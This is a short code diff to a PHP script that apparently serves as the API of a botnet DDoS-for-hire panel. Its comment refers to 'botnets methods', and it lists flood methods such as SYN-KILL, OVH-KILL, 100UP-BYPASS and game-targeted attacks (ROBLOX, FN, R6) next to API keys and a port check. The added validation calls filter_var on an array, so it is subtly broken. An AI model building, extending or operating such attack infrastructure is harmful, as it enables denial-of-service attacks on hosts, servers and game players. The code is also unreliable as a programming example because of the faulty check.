@@ -20,7 +20,7 @@
     $for = $_GET['for'];
 
     // Change the arrays to your API Keys and botnets methods
-    $validKeys = array("MYKEYS", "STILLMINE", "putyourkeyshere");
+    $basicKey = array("MYKEYS", "STILLMINE", "putyourkeyshere");
     $methodTypes = array("TCP", "TCP-X", "UDP", "HOME", "HOME-X", "100UP-BYPASS", "OVH-KILL", "SYN", "SYN-KILL", "NFO", "KILLALL", "FIVM-DROP", "ROBLOX", "APEX", "FN", "R6");
     $maxPort = 65535;
 
@@ -70,6 +70,11 @@
     if(filter_var($port, FILTER_VALIDATE_INT) == false || $port > $maxPort)
     {
         return die("Not a valid port");
+    }
+
+    if(filter_var($basicKey, FILTER_VALIDATE_INT) == false)
+    {
+        return die("Invalid format");
     }
 
     // If the method is this then run this script put run as the script 
